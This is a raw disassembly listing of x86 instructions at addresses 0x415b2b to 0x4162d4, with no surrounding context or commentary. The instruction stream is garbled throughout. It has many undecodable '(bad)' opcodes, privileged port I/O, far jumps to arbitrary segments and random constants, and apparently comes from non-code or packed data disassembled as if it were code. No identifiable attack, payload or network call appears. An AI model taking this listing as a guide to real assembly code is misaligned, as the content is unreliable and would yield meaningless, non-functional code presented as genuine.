  415b2b:	lock jae 0x415ac7
  415b2e:	jge    0x415ae1
  415b30:	je     0x415ab4
  415b32:	in     eax,0x9c
  415b34:	or     eax,0xe22d8439
  415b39:	cdq    
  415b3a:	push   ss
  415b3b:	mov    dh,0x9e
  415b3d:	inc    eax
  415b3e:	sbb    eax,0xa7e07eec
  415b43:	xchg   esi,eax
  415b44:	mov    ah,0xed
  415b46:	jmp    0xc152:0x60e316fc
  415b4d:	arpl   WORD PTR [edx],di
  415b4f:	or     ecx,DWORD PTR [eax+edi*8]
  415b52:	xor    al,0xb9
  415b54:	(bad)  
  415b55:	outs   dx,BYTE PTR ds:[esi]
  415b56:	scas   al,BYTE PTR es:[edi]
  415b57:	xchg   edi,eax
  415b58:	inc    BYTE PTR [edx-0x2fa59fd8]
  415b5e:	jmp    0x415b8e
  415b60:	cmc    
  415b61:	sbb    bh,dl
  415b63:	cmp    eax,edi
  415b65:	push   es
  415b66:	pop    es
  415b67:	imul   edi,DWORD PTR [ebx-0x4],0xdd485fdb
  415b6e:	ret    0x49fe
  415b71:	jbe    0x415b53
  415b73:	cmc    
  415b74:	imul   edi,DWORD PTR [edi],0x318225f2
  415b7a:	pop    edi
  415b7b:	aad    0x32
  415b7d:	push   ecx
  415b7e:	outs   dx,BYTE PTR ds:[esi]
  415b7f:	xor    al,0xed
  415b81:	xchg   edx,eax
  415b82:	jb     0x415b18
  415b84:	mov    BYTE PTR [edx-0x58e2c3b7],cl
  415b8a:	ins    DWORD PTR es:[edi],dx
  415b8b:	pop    ds
  415b8c:	xchg   edx,eax
  415b8d:	outs   dx,DWORD PTR ds:[esi]
  415b8e:	mov    DWORD PTR [edi],esp
  415b90:	and    DWORD PTR [edi-0x11],ebp
  415b93:	push   eax
  415b94:	sti    
  415b95:	les    edi,FWORD PTR [esi]
  415b97:	clc    
  415b98:	add    al,0xb8
  415b9a:	test   DWORD PTR [esi+0x0],ecx
  415b9d:	adc    eax,0xac23b18a
  415ba2:	aas    
  415ba3:	and    ch,BYTE PTR [ebp+esi*4+0x63889c9f]
  415baa:	(bad)  
  415bab:	daa    
  415bac:	into   
  415bad:	and    ecx,DWORD PTR [ecx]
  415baf:	scas   eax,DWORD PTR es:[edi]
  415bb0:	retf   
  415bb1:	fidiv  WORD PTR [esi]
  415bb3:	fdiv   DWORD PTR [edi-0x1b]
  415bb6:	dec    edx
  415bb7:	or     BYTE PTR [ebx*8-0x144baba6],ah
  415bbe:	xchg   edi,eax
  415bbf:	lods   eax,DWORD PTR ds:[esi]
  415bc0:	(bad)  
  415bc2:	xchg   edi,eax
  415bc3:	xor    al,0xd7
  415bc5:	(bad)  
  415bc8:	pusha  
  415bc9:	mov    ebx,0x47c16e06
  415bce:	sub    BYTE PTR [bx+si],al
  415bd1:	stc    
  415bd2:	and    dh,0x99
  415bd5:	or     al,0x13
  415bd7:	mov    eax,0x5f6cc641
  415bdc:	sub    eax,0xd02e0617
  415be1:	xchg   DWORD PTR [ecx+0x2e],ebx
  415be4:	rcr    esi,0x2
  415be7:	(bad)  
  415be8:	sub    cl,ch
  415bea:	pop    eax
  415beb:	xchg   esi,eax
  415bec:	cli    
  415bed:	jmp    0x2853:0xdcee2a29
  415bf4:	inc    DWORD PTR [ebx+0x46431c25]
  415bfa:	shl    DWORD PTR [eax-0x4],cl
  415bfd:	into   
  415bfe:	jb     0x415c4e
  415c00:	clc    
  415c01:	sbb    ch,ah
  415c03:	iret   
  415c04:	retf   
  415c05:	mov    esi,DWORD PTR [edx+ebx*4]
  415c08:	push   cs
  415c09:	inc    ebp
  415c0a:	shl    DWORD PTR [eax+0x73c5d40d],0x32
  415c11:	cmp    al,BYTE PTR [esi]
  415c13:	les    ebx,FWORD PTR [ecx+0x11]
  415c16:	or     dl,BYTE PTR [edi]
  415c18:	push   ds
  415c19:	mov    ds:0xc1d4668b,al
  415c1e:	pop    edx
  415c1f:	mov    ecx,DWORD PTR [ebp-0x15c460d7]
  415c25:	dec    esp
  415c26:	mov    cs,WORD PTR [edx+esi*2-0x269ba380]
  415c2d:	push   0xd2a159c3
  415c32:	and    al,0xc9
  415c34:	mov    dh,BYTE PTR [ebp+0x620c6ddd]
  415c3a:	clc    
  415c3b:	(bad)  
  415c3c:	mov    ebp,0x3c2f189a
  415c41:	adc    esp,DWORD PTR [esi]
  415c43:	jae    0x415cb9
  415c45:	icebp  
  415c46:	ins    DWORD PTR es:[edi],dx
  415c47:	in     eax,0xef
  415c49:	pop    es
  415c4a:	popa   
  415c4b:	bound  edx,QWORD PTR [edx+0xea6eb9]
  415c51:	ins    BYTE PTR es:[edi],dx
  415c52:	retf   
  415c53:	ss iret 
  415c55:	and    BYTE PTR [ebx+ebp*2-0x76284106],0x76
  415c5d:	jl     0x415c8a
  415c5f:	test   eax,0x1f2a8bad
  415c64:	pop    esp
  415c65:	push   es
  415c66:	sub    al,0xd6
  415c68:	pop    es
  415c69:	add    eax,0x655b201a
  415c6e:	scas   eax,DWORD PTR es:[edi]
  415c6f:	push   eax
  415c70:	aas    
  415c71:	imul   BYTE PTR [esi-0x429ece55]
  415c77:	sar    DWORD PTR [eax],0x9e
  415c7a:	imul   ecx,DWORD PTR [edx-0x1ff35882],0x5fe23671
  415c84:	lea    ebx,[eax-0x2c]
  415c87:	pop    ebp
  415c88:	leave  
  415c89:	xchg   ebx,eax
  415c8a:	pop    esi
  415c8b:	jno    0x415c5c
  415c8d:	leave  
  415c8e:	xor    al,0xee
  415c90:	sbb    edi,DWORD PTR [eax-0x13f694c6]
  415c96:	mov    ebp,0x1ca74c8c
  415c9b:	push   ebx
  415c9c:	sahf   
  415c9d:	loop   0x415c6d
  415c9f:	add    ebx,edx
  415ca1:	xchg   BYTE PTR [ecx+0x54eba80f],bh
  415ca7:	adc    bh,BYTE PTR [eax+0x2c]
  415caa:	mov    esp,0xe1d4b4cb
  415caf:	xor    bh,dl
  415cb1:	xchg   DWORD PTR [eax-0x770fab6c],ebx
  415cb7:	mov    DWORD PTR [ebp-0x6dc030ec],edi
  415cbd:	mov    eax,ds:0x24d8b401
  415cc2:	(bad)  
  415cc3:	lds    ebp,FWORD PTR [edi-0x66]
  415cc6:	mov    BYTE PTR [eax+0x62],bh
  415cc9:	push   ecx
  415cca:	clc    
  415ccb:	(bad)  
  415ccd:	mov    eax,ds:0xa0854c63
  415cd2:	add    ah,BYTE PTR [edi-0x61]
  415cd5:	fisttp WORD PTR [eax]
  415cd7:	enter  0x59a,0x0
  415cdb:	lods   eax,DWORD PTR ds:[esi]
  415cdc:	shl    BYTE PTR [esi],0x97
  415cdf:	sbb    ebx,DWORD PTR [edx+0xd]
  415ce2:	iret   
  415ce3:	inc    esi
  415ce4:	pop    esp
  415ce5:	lods   al,BYTE PTR ds:[esi]
  415ce6:	xor    DWORD PTR [edi],0xffffffeb
  415ce9:	out    dx,eax
  415cea:	hlt    
  415ceb:	jecxz  0x415cca
  415ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cee:	std    
  415cef:	adc    al,0x6e
  415cf1:	in     al,dx
  415cf2:	stc    
  415cf3:	sbb    bh,cl
  415cf5:	push   ecx
  415cf6:	and    cl,BYTE PTR [edx]
  415cf8:	or     edx,DWORD PTR [eax]
  415cfa:	sti    
  415cfb:	dec    esp
  415cfc:	jb     0x415cd5
  415cfe:	add    bl,BYTE PTR [esi]
  415d00:	loopne 0x415c98
  415d02:	aam    0x14
  415d04:	enter  0x378a,0xaf
  415d08:	jno    0x415cf2
  415d0a:	or     DWORD PTR [ebx-0x4a8ca17e],esp
  415d10:	mov    esp,0xc2c9cecc
  415d15:	jb     0x415c9e
  415d17:	mov    eax,ds:0x9b1d07c7
  415d1c:	and    al,0xb6
  415d1e:	loope  0x415d9d
  415d20:	in     eax,0xf4
  415d22:	pop    ecx
  415d23:	outs   dx,DWORD PTR ds:[esi]
  415d24:	sub    cl,bl
  415d26:	push   0x2
  415d28:	test   eax,0x5f044d49
  415d2d:	sar    bl,0xc9
  415d30:	in     eax,0xb6
  415d32:	(bad)  
  415d33:	sbb    ebp,DWORD PTR ds:0xb3133f7a
  415d39:	and    esp,eax
  415d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d3c:	xor    bh,BYTE PTR [ebp-0x48]
  415d3f:	enter  0xca14,0xc0
  415d43:	pop    ss
  415d44:	xor    al,0x48
  415d46:	or     cl,BYTE PTR [esi+0x2]
  415d49:	pusha  
  415d4a:	stos   DWORD PTR es:[edi],eax
  415d4b:	xchg   edx,eax
  415d4c:	scas   al,BYTE PTR es:[edi]
  415d4d:	mov    esi,0x8b93adf8
  415d52:	fcom   QWORD PTR [eax-0x3ad9ddaf]
  415d58:	icebp  
  415d59:	xchg   esp,eax
  415d5a:	arpl   sp,dx
  415d5c:	lahf   
  415d5d:	sbb    al,0x32
  415d5f:	xor    esp,edx
  415d61:	(bad)  
  415d62:	sub    al,0xa
  415d64:	dec    ebx
  415d65:	and    esp,DWORD PTR [eax+0x7b119f13]
  415d6b:	push   esp
  415d6c:	cmp    cl,dh
  415d6e:	cdq    
  415d6f:	xchg   ecx,eax
  415d70:	sub    BYTE PTR [eax+edx*2-0x1ca40151],cl
  415d77:	xchg   BYTE PTR [esi+eax*8+0x0],bl
  415d7b:	cmp    al,0xdf
  415d7d:	outs   dx,BYTE PTR ds:[esi]
  415d7e:	cs pop esp
  415d80:	test   DWORD PTR ds:0x223b9,esi
  415d86:	xor    edx,DWORD PTR [edx+eiz*2+0x6ca77bf2]
  415d8d:	cmp    DWORD PTR [edx],0x17a6dfec
  415d93:	jge    0x415d9e
  415d95:	and    DWORD PTR ds:0x12fd3f9c,edi
  415d9b:	and    esi,ebp
  415d9d:	test   eax,0xf66cecab
  415da2:	(bad)  
  415da3:	popa   
  415da4:	outs   dx,DWORD PTR ds:[esi]
  415da5:	cmp    esp,DWORD PTR [ebp-0x342a4512]
  415dab:	inc    eax
  415dac:	outs   dx,BYTE PTR ds:[esi]
  415dad:	and    al,0xfb
  415daf:	scas   al,BYTE PTR es:[edi]
  415db0:	mov    dl,0x64
  415db2:	daa    
  415db3:	inc    esi
  415db4:	sub    ecx,DWORD PTR [ebx-0x53fac94d]
  415dba:	push   esi
  415dbb:	mov    ds:0xd1e35f55,eax
  415dc0:	iret   
  415dc1:	push   cs
  415dc2:	sub    eax,0x3fe02d9f
  415dc7:	mov    ds:0x38ce5615,eax
  415dcc:	or     eax,0x5035a032
  415dd1:	push   ecx
  415dd2:	or     dl,BYTE PTR [edx]
  415dd4:	xor    eax,0x9e655dc0
  415dd9:	(bad)  
  415dda:	jbe    0x415d7f
  415ddc:	outs   dx,DWORD PTR ds:[esi]
  415ddd:	pushf  
  415dde:	mov    al,ds:0xfc8ac5c8
  415de3:	pop    es
  415de4:	jns    0x415d8b
  415de6:	xor    DWORD PTR [edi],0xc1f9cf4a
  415dec:	rcl    BYTE PTR [ebx+0x2],0x82
  415df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df1:	jnp    0x415e47
  415df3:	in     al,dx
  415df4:	lea    eax,[ecx-0x4c0cb0db]
  415dfa:	jge    0x415e44
  415dfc:	test   DWORD PTR ds:0x260527e8,ebx
  415e02:	jmp    0x8a91:0x4a995043
  415e09:	fimul  WORD PTR [ebx-0x2fb3a0d3]
  415e0f:	and    BYTE PTR [esi-0x71],al
  415e12:	dec    edx
  415e13:	gs cli 
  415e15:	outs   dx,DWORD PTR ds:[esi]
  415e16:	into   
  415e17:	mov    ebx,0x7ea50aea
  415e1c:	push   0xb0f86fc8
  415e21:	cmp    eax,0x649ea321
  415e26:	sti    
  415e27:	cmp    esp,DWORD PTR [eax+0x1b]
  415e2a:	stos   BYTE PTR es:[edi],al
  415e2b:	aam    0x39
  415e2d:	shl    cl,cl
  415e2f:	das    
  415e30:	sbb    BYTE PTR [ebx],bh
  415e32:	(bad)  
  415e33:	dec    eax
  415e34:	xchg   ebp,eax
  415e35:	test   eax,0xb3c5fb7e
  415e3a:	dec    ax
  415e3c:	sub    esi,edi
  415e3e:	call   0x2f37:0x70581e85
  415e45:	loopne 0x415de4
  415e47:	add    eax,DWORD PTR [ebp-0x5201c881]
  415e4d:	lods   eax,DWORD PTR ds:[esi]
  415e4e:	mov    ch,0x72
  415e50:	jmp    0x415e49
  415e52:	pop    esp
  415e53:	add    BYTE PTR [edi-0x76c9a94c],dh
  415e59:	inc    esp
  415e5a:	js     0x415e4a
  415e5c:	fld    st(7)
  415e5e:	xor    DWORD PTR [eax],0x2d
  415e61:	addr16 pop edi
  415e63:	ds cmp ebp,0xffffffb8
  415e67:	mov    ds,WORD PTR [ecx]
  415e69:	cmc    
  415e6a:	ds dec eax
  415e6c:	adc    edi,edx
  415e6e:	inc    esp
  415e6f:	jl     0x415e94
  415e71:	cmp    eax,0x7a3a1d5
  415e76:	inc    ebx
  415e77:	test   eax,0xe3418e76
  415e7c:	xchg   ebp,eax
  415e7d:	mov    dl,0x25
  415e7f:	pop    ds
  415e80:	mov    cl,0xc5
  415e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e83:	shr    DWORD PTR [eax],1
  415e85:	mov    ecx,edi
  415e87:	ficom  WORD PTR [ecx+0x41]
  415e8a:	xchg   ebp,eax
  415e8b:	jg     0x415e1f
  415e8d:	jg     0x415e35
  415e8f:	mov    bh,0xf5
  415e91:	push   0xffffffcb
  415e93:	aam    0xa3
  415e95:	test   al,0x23
  415e97:	cmp    esp,edi
  415e99:	jae    0x415e31
  415e9b:	mov    dh,0xa1
  415e9d:	xor    bl,bh
  415e9f:	fldcw  WORD PTR [ecx-0x14db5136]
  415ea5:	int    0xb7
  415ea7:	or     al,0x2b
  415ea9:	mov    eax,DWORD PTR [edx+0x2e]
  415eac:	fist   WORD PTR [edx]
  415eae:	in     eax,dx
  415eaf:	shr    BYTE PTR [edi+0x47e4ae9b],cl
  415eb5:	scas   al,BYTE PTR es:[edi]
  415eb6:	(bad)  
  415eb7:	jg     0x415eeb
  415eb9:	jmp    0x8317:0x6a47a063
  415ec0:	stos   DWORD PTR es:[edi],eax
  415ec1:	dec    esi
  415ec2:	(bad)  
  415ec3:	sbb    BYTE PTR [edi+eax*2],bh
  415ec6:	xchg   ebp,eax
  415ec7:	pop    esi
  415ec8:	jmp    0xf25fb9e3
  415ecd:	push   0x32
  415ecf:	imul   DWORD PTR [edx+0x24]
  415ed2:	aas    
  415ed3:	mov    ecx,0x7b31c59e
  415ed8:	loopne 0x415e8d
  415eda:	dec    esi
  415edb:	or     ebp,DWORD PTR [edi+0x3c]
  415ede:	lds    ecx,FWORD PTR ds:0xd2919b8e
  415ee4:	mov    ?,WORD PTR [ecx+0x53]
  415ee7:	adc    edi,DWORD PTR [esi-0x7cd32a23]
  415eed:	push   ds
  415eee:	mov    ds,WORD PTR [edx-0x53]
  415ef1:	(bad)  
  415ef3:	fidivr DWORD PTR [edi]
  415ef5:	out    0xe7,eax
  415ef7:	stos   BYTE PTR es:[edi],al
  415ef8:	cmp    DWORD PTR [ecx-0x23],edi
  415efb:	pop    ds
  415efc:	push   cs
  415efd:	pop    ebx
  415efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eff:	xlat   BYTE PTR ds:[ebx]
  415f00:	mov    ebp,0x86e705f0
  415f05:	xchg   ecx,eax
  415f06:	xor    al,0xfd
  415f08:	dec    ebx
  415f09:	and    ecx,DWORD PTR [esi-0x52613484]
  415f0f:	ds mov edi,0xf031c409
  415f15:	fcom   DWORD PTR [esi-0x31507834]
  415f1b:	or     al,0x16
  415f1d:	dec    edx
  415f1e:	inc    ecx
  415f1f:	leave  
  415f20:	mov    ah,0x51
  415f22:	xor    eax,0x413cf963
  415f27:	jl     0x415f0a
  415f29:	(bad)  
  415f2a:	push   ecx
  415f2b:	mov    edi,0x35761caf
  415f30:	(bad)
  415f33:	sub    eax,DWORD PTR [esp+edi*4]
  415f36:	or     BYTE PTR [edi+0x3f],dh
  415f39:	pop    esi
  415f3a:	xchg   esi,eax
  415f3b:	lods   al,BYTE PTR ds:[esi]
  415f3c:	rcl    bl,cl
  415f3e:	push   0x3187a5cf
  415f43:	mov    esi,0xcccd5e5
  415f48:	repnz cmp DWORD PTR [ecx],esp
  415f4b:	jl     0x415ed0
  415f4d:	mov    dl,0x62
  415f4f:	jnp    0x415f17
  415f51:	das    
  415f52:	dec    edx
  415f53:	jp     0x415f9b
  415f55:	add    al,ah
  415f57:	and    esp,eax
  415f59:	fwait
  415f5a:	imul   DWORD PTR ds:[esi+edx*1]
  415f5e:	aaa    
  415f5f:	gs xchg edi,eax
  415f61:	jl     0x415fae
  415f63:	test   BYTE PTR [esi],ah
  415f65:	push   edx
  415f66:	(bad)  
  415f67:	out    0x37,al
  415f69:	and    eax,0x97eeec
  415f6e:	lock xchg BYTE PTR [esi-0x10f5a5fe],ch
  415f75:	cmp    DWORD PTR [bx+di-0x3370],ecx
  415f7a:	push   edi
  415f7b:	ret    0xa383
  415f7e:	(bad)  
  415f7f:	fwait
  415f80:	retf   
  415f81:	xchg   edi,eax
  415f82:	test   BYTE PTR [edx-0x41f75c44],ah
  415f88:	shl    DWORD PTR [eax],1
  415f8a:	xor    dh,BYTE PTR ds:0x116923d0
  415f90:	jmp    0xabd:0x448dedbe
  415f97:	jnp    0x416006
  415f99:	aam    0x3e
  415f9b:	lds    ebx,FWORD PTR [edx-0x156ba8a1]
  415fa1:	xor    BYTE PTR [edx-0x1c6bc7e7],bh
  415fa7:	dec    ebp
  415fa8:	ss jbe 0x416023
  415fab:	mov    cl,0x91
  415fad:	in     eax,0xc8
  415faf:	push   0x20405109
  415fb4:	imul   ecx,DWORD PTR [edx+0x35],0xffffff8d
  415fb8:	inc    ecx
  415fb9:	cmp    eax,0x5d4e47c5
  415fbe:	fmul   QWORD PTR [esi]
  415fc0:	cdq    
  415fc1:	idiv   BYTE PTR [eax]
  415fc3:	ret    
  415fc4:	dec    ecx
  415fc5:	xor    dl,BYTE PTR [eax]
  415fc7:	sahf   
  415fc8:	je     0x416003
  415fca:	aaa    
  415fcb:	or     dl,bl
  415fcd:	add    BYTE PTR [eax+0xe],dl
  415fd0:	loope  0x415f60
  415fd2:	iret   
  415fd3:	je     0x415f9c
  415fd5:	in     eax,0x30
  415fd7:	sbb    BYTE PTR ds:0xe7e5d8a3,dl
  415fdd:	add    edx,DWORD PTR [ecx]
  415fdf:	rcr    ecx,0x30
  415fe2:	(bad)  
  415fe3:	jmp    0x415f8a
  415fe5:	mov    bp,0x889f
  415fe9:	aad    0x3a
  415feb:	adc    BYTE PTR [esi],0x6b
  415fee:	mov    ah,0x9
  415ff0:	sub    DWORD PTR [edx+0x2fca6d2b],ebx
  415ff6:	xchg   ecx,eax
  415ff7:	rcr    DWORD PTR [ebx-0x20],cl
  415ffa:	(bad)  
  415ffc:	(bad)  
  415ffd:	iret   
  415ffe:	adc    al,0x4e
  416000:	out    dx,eax
  416001:	fidiv  WORD PTR [ebp+ebx*8-0x51693271]
  416008:	sub    eax,0x9f1b4935
  41600d:	ds (bad) 
  41600f:	xchg   edi,eax
  416010:	sar    bl,1
  416012:	(bad)  
  416013:	jo     0x41608e
  416015:	sub    DWORD PTR [edi+0x7efd1c53],ebp
  41601b:	cmp    DWORD PTR [edx-0x5e],ecx
  41601e:	cld    
  41601f:	mov    al,0x70
  416021:	jno    0x41602d
  416023:	mov    edi,DWORD PTR [esi-0x72]
  416026:	lahf   
  416027:	cmp    BYTE PTR [edi],dl
  416029:	mov    dh,0x92
  41602b:	mov    ds:0x32733d97,eax
  416030:	add    DWORD PTR ds:0xad57e8c9,esp
  416036:	xlat   BYTE PTR ds:[ebx]
  416037:	imul   ebx,DWORD PTR [edi+ebp*2+0x6d],0x42f751cf
  41603f:	pop    ebp
  416040:	scas   eax,DWORD PTR es:[edi]
  416041:	cmp    DWORD PTR [ebx-0x68],0x3c62b8c
  416048:	inc    esi
  416049:	icebp  
  41604a:	dec    esp
  41604b:	ins    DWORD PTR es:[edi],dx
  41604c:	(bad)  
  41604d:	adc    eax,0x9e39ea89
  416052:	inc    eax
  416053:	pop    eax
  416054:	gs sbb edi,eax
  416057:	mov    ah,0x4c
  416059:	or     al,0xec
  41605b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41605c:	hlt    
  41605d:	inc    ebp
  41605e:	aam    0xff
  416060:	addr16 aaa 
  416062:	xchg   ecx,eax
  416063:	dec    ecx
  416064:	enter  0xbbe8,0xaa
  416068:	or     bl,BYTE PTR [edi+0x6a]
  41606b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41606c:	mov    ss,WORD PTR [eax]
  41606e:	mov    ebx,0x7d7e63ff
  416073:	popa   
  416074:	and    ch,BYTE PTR [edx+0x60324a85]
  41607a:	and    BYTE PTR [eax+0x45109c7e],bl
  416080:	pop    esp
  416081:	popf   
  416082:	popa   
  416083:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416085:	cmp    ecx,DWORD PTR [edi]
  416087:	jge    0x4160b4
  416089:	loop   0x4160a0
  41608b:	mov    bh,dl
  41608d:	lods   al,BYTE PTR ds:[esi]
  41608e:	add    ch,0xbe
  416091:	jns    0x41603c
  416093:	out    0x16,eax
  416095:	sbb    cl,BYTE PTR [edx]
  416097:	rep movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41609a:	mov    dl,0xf
  41609c:	sub    al,0xd
  41609e:	rcl    BYTE PTR [edi],cl
  4160a0:	mov    bh,0xda
  4160a2:	or     DWORD PTR [edi],edi
  4160a4:	cmp    ch,bh
  4160a6:	std    
  4160a7:	mov    ah,BYTE PTR [ecx+0x3b]
  4160aa:	fist   WORD PTR [ebp+eax*1-0x79b39c87]
  4160b1:	jbe    0x4160b7
  4160b3:	call   0x26557c6a
  4160b8:	fisubr WORD PTR [ebp-0x34bd4878]
  4160be:	outs   dx,BYTE PTR ds:[esi]
  4160bf:	pop    edx
  4160c0:	inc    esi
  4160c1:	jnp    0x41612e
  4160c3:	paddb  mm5,mm7
  4160c6:	mov    edx,0x21776826
  4160cb:	addr16 loope 0x41610b
  4160ce:	cdq    
  4160cf:	pop    eax
  4160d0:	scas   al,BYTE PTR es:[edi]
  4160d1:	pop    edx
  4160d2:	dec    esp
  4160d3:	aad    0x8e
  4160d5:	pop    edi
  4160d6:	clc    
  4160d7:	cmp    eax,0x77308
  4160dc:	imul   esi,DWORD PTR [eax+ecx*8],0xffffffbb
  4160e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e1:	mov    esi,0xeaecce86
  4160e6:	test   BYTE PTR [ebx+esi*2],cl
  4160e9:	pop    edi
  4160ea:	sbb    BYTE PTR [edi+0x33],al
  4160ed:	sahf   
  4160ee:	mov    ds:0x96b5bf34,al
  4160f3:	jecxz  0x41615f
  4160f5:	iret   
  4160f6:	mov    al,0x5d
  4160f8:	mov    al,gs:0x5733f0ec
  4160fe:	clc    
  4160ff:	pop    ebx
  416100:	dec    edx
  416101:	fs aas 
  416103:	ja     0x416118
  416105:	jl     0x41615d
  416107:	mov    ah,0xcc
  416109:	add    ch,dh
  41610b:	xchg   ebx,eax
  41610c:	push   ebp
  41610d:	test   BYTE PTR [esi+0x1ee6f0b1],ah
  416113:	or     esp,DWORD PTR [ebx+ecx*4]
  416116:	dec    edi
  416117:	lea    esp,[esi]
  416119:	daa    
  41611a:	dec    ecx
  41611b:	xor    eax,0xcb742d06
  416120:	iret   
  416121:	add    DWORD PTR [edi+0x7ec62bf5],ebp
  416127:	mov    edx,DWORD PTR [ecx-0x655b6cd6]
  41612d:	xor    al,0x5b
  41612f:	fild   QWORD PTR [ebx+0x5c]
  416132:	or     DWORD PTR [edx],0xc2726d23
  416138:	cmp    bl,BYTE PTR [ebx+edi*1+0x12a8fa16]
  41613f:	inc    ebx
  416140:	push   edx
  416141:	pop    esi
  416142:	sub    DWORD PTR [edi],esi
  416144:	loope  0x416135
  416146:	int3   
  416147:	cmp    eax,DWORD PTR [edx+0x32]
  41614a:	imul   eax,DWORD PTR [esi-0x6b],0xffffffca
  41614e:	fidivr DWORD PTR [esi]
  416150:	add    bh,BYTE PTR [esi+0x225fb901]
  416156:	xor    DWORD PTR [ebx],edx
  416158:	dec    ebp
  416159:	push   eax
  41615a:	int    0xff
  41615c:	xchg   BYTE PTR [edi],ah
  41615e:	push   ebx
  41615f:	lock cmp bl,BYTE PTR ds:0x10c22b40
  416166:	loopne 0x4160fc
  416168:	mov    al,ds:0xb9cea362
  41616d:	(bad)  
  41616e:	xor    al,0x2c
  416170:	mov    ds:0x9bea428e,al
  416175:	stos   BYTE PTR es:[edi],al
  416176:	test   eax,0xddad6ee7
  41617b:	repnz fst DWORD PTR [esi-0x16]
  41617f:	mov    ah,0xb5
  416181:	rol    BYTE PTR [esi],cl
  416183:	push   DWORD PTR [edi+edx*8-0x43]
  416187:	into   
  416188:	and    ah,BYTE PTR [edx-0x5614b096]
  41618e:	dec    edi
  41618f:	sbb    dh,BYTE PTR [ecx+0x2bf98961]
  416195:	out    0x73,al
  416197:	and    ebp,DWORD PTR [esi]
  416199:	shl    BYTE PTR [edi+0x4dfaa202],cl
  41619f:	mov    ecx,0x85b508b4
  4161a4:	cld    
  4161a5:	rcl    DWORD PTR [edx-0x456ba14e],cl
  4161ab:	retf   0xd9c4
  4161ae:	mov    eax,ds:0x523df38a
  4161b3:	fistp  DWORD PTR [eax-0x31]
  4161b6:	ret    0xa1f1
  4161b9:	repnz push ds
  4161bb:	repz mov dh,0x25
  4161be:	cmp    DWORD PTR [edi+0x2d],edx
  4161c1:	add    esi,esi
  4161c3:	xchg   edx,eax
  4161c4:	push   esp
  4161c5:	sbb    ah,ah
  4161c7:	cwde   
  4161c8:	pop    ss
  4161c9:	xor    ebx,DWORD PTR [ebx]
  4161cb:	mov    BYTE PTR ds:0x481dcc66,0xf7
  4161d2:	sub    esi,esp
  4161d4:	adc    al,0x23
  4161d6:	and    DWORD PTR [edx+eiz*1+0x567afd6c],edi
  4161dd:	adc    esp,DWORD PTR [eax]
  4161df:	(bad)  
  4161e0:	push   esi
  4161e1:	js     0x41622d
  4161e3:	pop    edx
  4161e4:	pop    eax
  4161e5:	cwde   
  4161e6:	fisubr WORD PTR [ecx]
  4161e8:	loope  0x416173
  4161ea:	pop    ebp
  4161eb:	and    eax,DWORD PTR [eax-0x58]
  4161ee:	arpl   WORD PTR [esi],bp
  4161f0:	rol    bl,1
  4161f2:	imul   eax,DWORD PTR [edi-0x60],0x1f
  4161f6:	das    
  4161f7:	pop    ss
  4161f8:	jno    0x416211
  4161fa:	iret   
  4161fb:	mov    BYTE PTR [ebp+0x6c],dl
  4161fe:	mov    dl,0x21
  416200:	fist   DWORD PTR [edi]
  416202:	repz aam 0x2d
  416205:	jnp    0x4161bc
  416207:	mov    ds:0x44f385dc,eax
  41620c:	mov    ecx,0x7b77eef1
  416211:	inc    esp
  416212:	loopne 0x416197
  416214:	repz lock add eax,0x3a73635c
  41621b:	mov    cl,0x89
  41621d:	and    BYTE PTR [eax],cl
  41621f:	scas   eax,DWORD PTR es:[edi]
  416220:	mov    gs,WORD PTR [eax-0x11f6286c]
  416226:	and    eax,0x25bfb54a
  41622b:	push   ds
  41622c:	jp     0x416270
  41622e:	dec    ebp
  41622f:	xor    DWORD PTR [edi+eiz*8-0x4cdb25fe],0x7ddd767e
  41623a:	aaa    
  41623b:	pop    esp
  41623c:	out    dx,al
  41623d:	into   
  41623e:	xchg   ebx,eax
  41623f:	stos   BYTE PTR es:[edi],al
  416240:	fadd   QWORD PTR [edi]
  416242:	outs   dx,BYTE PTR ds:[esi]
  416243:	repz sub ecx,DWORD PTR [ebx-0x695a291]
  41624a:	mov    WORD PTR [eax+0x4],ss
  41624d:	shr    DWORD PTR [edi-0x8],1
  416250:	lahf   
  416251:	ror    DWORD PTR [eax-0x3120bfe2],0x2f
  416258:	and    cl,BYTE PTR ds:0x54a3d2f9
  41625e:	lea    edi,[ebp-0x74]
  416261:	pop    eax
  416262:	xor    eax,DWORD PTR [edx+0x44b6d62c]
  416268:	jmp    0x41624f
  41626a:	movsx  ebx,BYTE PTR [ebp+0x13]
  41626e:	pop    ecx
  41626f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416270:	push   edx
  416271:	std    
  416272:	sub    al,0xea
  416274:	out    0x49,al
  416276:	jle    0x41620c
  416278:	add    eax,0x8f54712
  41627d:	cdq    
  41627e:	dec    ecx
  41627f:	psrld  mm2,mm6
  416282:	cmp    edx,DWORD PTR [edx-0x6fd7c7f2]
  416288:	jno    0x4162a7
  41628a:	xchg   esp,eax
  41628b:	call   0x26a4:0xf55f1643
  416292:	cmp    eax,0x92ed4bda
  416297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416298:	jns    0x416224
  41629a:	jg     0x4162fb
  41629c:	lods   eax,DWORD PTR ds:[esi]
  41629d:	or     bh,ah
  41629f:	ret    0xf380
  4162a2:	and    bh,BYTE PTR [eax+0x767acabb]
  4162a8:	push   cs
  4162a9:	pop    edx
  4162aa:	hlt    
  4162ab:	imul   esi,DWORD PTR [ecx+0x6dc6a0d7],0xa
  4162b2:	cmp    ecx,DWORD PTR [ecx]
  4162b4:	xor    eax,0x5f7f5de5
  4162b9:	mov    al,ds:0xe2ee8594
  4162be:	mov    ebx,DWORD PTR [ecx+0x76a788b4]
  4162c4:	ja     0x416334
  4162c6:	frstor [edi+0x7a]
  4162c9:	jbe    0x41632a
  4162cb:	pop    esi
  4162cc:	in     eax,dx
  4162cd:	sbb    DWORD PTR [esi-0x23424837],ebp
  4162d3:	(bad)  
  4162d4:	rcl    DWORD PTR ds:0x6b1af7ab,1
